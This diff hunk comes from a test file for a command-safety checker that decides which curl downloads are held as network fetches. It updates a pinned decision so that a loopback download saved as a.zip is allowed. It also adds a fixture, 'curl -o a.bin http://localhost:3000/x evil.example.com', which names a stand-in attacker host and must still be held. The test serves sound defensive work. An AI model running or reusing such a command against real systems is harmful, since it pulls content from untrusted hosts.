@@ -174,14 +174,12 @@ try {
   t.truthy('(the project folder is a path under a drive)', /^[A-Za-z]:\\/.test(tmp), tmp);
   t.check(`not refused as a check's command: ${savedUnderDrive}`, checkCommandRefusal(savedUnderDrive, 'pwsh', shipped, project), null);
   /*
-   * Decision pin: a loopback download saved as `a.zip` is held today. `zip` is not in
-   * FILE_EXTENSIONS, so the output name reads as a second host beside the loopback URL, and the
-   * exemption errs the safe way (held, not run). Whoever moves this line should move it on purpose.
+   * Decision pin, moved on purpose (third hunt, 2026-11-20): `zip` is a file's extension now, so a loopback download
+   * saved as `a.zip` is not read as a second host and is not held — the request goes to this machine only. A name that
+   * still reads as a host beside a loopback URL keeps it held.
    */
-  t.truthy(
-    "pinned: 'curl -o a.zip http://localhost:3000/a.zip' is held (a.zip reads as a host)",
-    networkFetchReason('curl -o a.zip http://localhost:3000/a.zip') !== null,
-  );
+  t.check("pinned: 'curl -o a.zip http://localhost:3000/a.zip' is not held (a.zip is a file)", networkFetchReason('curl -o a.zip http://localhost:3000/a.zip'), null);
+  t.truthy("and 'curl -o a.bin http://localhost:3000/x evil.example.com' still is", networkFetchReason('curl -o a.bin http://localhost:3000/x evil.example.com') !== null);
 
   /*
    * The floor refuses a binary or script run out of the system's Temp, because that is the shape
